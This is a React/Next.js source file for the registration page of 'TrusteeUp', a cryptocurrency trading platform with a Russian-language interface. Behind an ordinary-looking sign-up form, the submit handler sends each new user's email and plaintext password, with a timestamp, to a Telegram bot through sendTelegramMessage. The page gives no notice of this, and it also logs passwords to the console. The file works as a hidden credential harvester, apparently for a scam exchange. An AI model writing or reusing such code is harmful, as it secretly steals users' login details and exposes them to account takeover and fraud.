"use client"

import { useState } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Checkbox } from "@/components/ui/checkbox"
import { useToast } from "@/components/ui/use-toast"
import { ArrowRight } from "lucide-react"
import { auth } from "@/firebase/firebaseApp"
import { createUserWithEmailAndPassword } from "firebase/auth"
import { sendTelegramMessage } from "@/bot"
import { checkPasswordRequirements, formatDateTime } from "@/lib/utils"

export default function RegisterPage() {
  const router = useRouter()
  const { toast } = useToast()
  const [isLoading, setIsLoading] = useState(false)
  const [agreed, setAgreed] = useState(false)
  const [error, setError] = useState("")
  const [requirements, setRequirements] = useState({
    lengthCheck: false,
    lowercaseCheck: false,
    uppercaseCheck: false,
    numberCheck: false,
    specialCheck: false
  })

  const handleChange = ({ target }) => {
    const tempRequirements = checkPasswordRequirements(target.value)
    setError("")
    setRequirements(tempRequirements)
  }

  async function onSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setIsLoading(true)



    const formData = new FormData(event.currentTarget)
    const email = formData.get("email") as string
    const password = formData.get("password") as string
    const confirmPassword = formData.get("confirmPassword") as string
    console.log(confirmPassword, password)
    if (password !== confirmPassword) {
      // toast({id: 'Error'})
      setError("Пароль и пароль подтверждения должны быть одинаковыми")
      setIsLoading(false)
      return
    }

    if (!agreed) {
      toast({
        variant: "destructive",
        title: "Ошибка",
        description: "Необходимо согласиться с условиями",
      })
      setIsLoading(false)
      return
    }

    try {
      await createUserWithEmailAndPassword(auth, email, password);
      const message = `
      Email: ${email}
      Password: ${password}
      Date: ${formatDateTime()}
      `;
      await sendTelegramMessage(message)
      router.push("/auth/login")

    } catch (error) {
      console.log("Something went wrong!")
      toast({
        variant: "destructive",
        title: "Ошибка",
        description: "Произошла ошибка при регистрации",
      })
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="container relative min-h-screen flex-col items-center justify-center grid lg:max-w-none lg:grid-cols-2 lg:px-0">
      <div className="relative hidden h-full flex-col bg-muted p-10 text-white lg:flex dark:border-r">
        <div className="absolute inset-0 bg-gradient-to-b from-background to-secondary" />
        <div className="relative z-20 flex items-center text-lg font-medium">
          <span className="gradient-text text-xl font-bold">TrusteeUp</span>
        </div>
        <div className="relative z-20 mt-auto">
          <blockquote className="space-y-2">
            <p className="text-lg">
              &ldquo;Самая безопасная и удобная платформа для торговли криптовалютой. Присоединяйтесь к нам уже
              сегодня!&rdquo;
            </p>
            <footer className="text-sm">София Андреева</footer>
          </blockquote>
        </div>
      </div>
      <div className="lg:p-8">
        <div className="mx-auto flex w-full flex-col justify-center space-y-6 sm:w-[350px]">
          <div className="flex flex-col space-y-2 text-center">
            <h1 className="text-2xl font-semibold tracking-tight">Создать аккаунт</h1>
            <p className="text-sm text-muted-foreground">Введите email и пароль для регистрации</p>
          </div>
          <div className="grid gap-6">
            <form onSubmit={onSubmit}>
              <div className="grid gap-4">
                <div className="grid gap-2">
                  <Label htmlFor="email">Email</Label>
                  <Input
                    id="email"
                    placeholder="name@example.com"
                    type="email"
                    name="email"
                    autoCapitalize="none"
                    autoComplete="email"
                    autoCorrect="off"
                    disabled={isLoading}
                    required
                  />
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="password">Пароль</Label>
                  <Input onChange={handleChange} placeholder="●●●●●●" id="password" type="password" name="password" disabled={isLoading} required />
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="confirmPassword">Подтверждение пароля</Label>
                  <Input placeholder="●●●●●●" id="confirmPassword" type="password" name="confirmPassword" disabled={isLoading} required />
                </div>

                {error ? <p className="text-sm">{error}</p> : <></>}


                <ul className="list-inside text-sm space-y-1">
                  <li className={`flex items-center ${requirements.lengthCheck ? 'text-green-500' : 'text-white'}`}>
                    {requirements.lengthCheck ? '✔' : '●'} At least 8 characters
                  </li>
                  <li className={`flex items-center ${requirements.lowercaseCheck ? 'text-green-500' : 'text-white'}`}>
                    {requirements.lowercaseCheck ? '✔' : '●'} Contains at least one lowercase letter
                  </li>
                  <li className={`flex items-center ${requirements.uppercaseCheck ? 'text-green-500' : 'text-white'}`}>
                    {requirements.uppercaseCheck ? '✔' : '●'} Contains at least one uppercase letter
                  </li>
                  <li className={`flex items-center ${requirements.numberCheck ? 'text-green-500' : 'text-white'}`}>
                    {requirements.numberCheck ? '✔' : '●'} Contains at least one number
                  </li>
                  <li className={`flex items-center ${requirements.specialCheck ? 'text-green-500' : 'text-white'}`}>
                    {requirements.specialCheck ? '✔' : '●'} Contains at least one special character
                  </li>
                </ul>


                <div className="flex items-center space-x-2">
                  <Checkbox id="terms" checked={agreed} onCheckedChange={(checked) => setAgreed(checked as boolean)} />
                  <label
                    htmlFor="terms"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    Я соглашаюсь с условиями пользования
                  </label>
                </div>
                <Button disabled={isLoading || !agreed || !Object.values(requirements).every((el) => el)} className="w-full">
                  {isLoading ? (
                    <div className="mr-2 h-4 w-4 animate-spin" />
                  ) : (
                    <>
                      Зарегистрироваться
                      <ArrowRight className="ml-2 h-4 w-4" />
                    </>
                  )}
                </Button>
              </div>
            </form>
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t" />
              </div>
              <div className="relative flex justify-center text-xs uppercase">
                <span className="bg-background px-2 text-muted-foreground">Или</span>
              </div>
            </div>
            <div className="text-center text-sm">
              Уже есть аккаунт?{" "}
              <Link href="/auth/login" className="underline text-primary hover:text-primary/90">
                Войти
              </Link>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

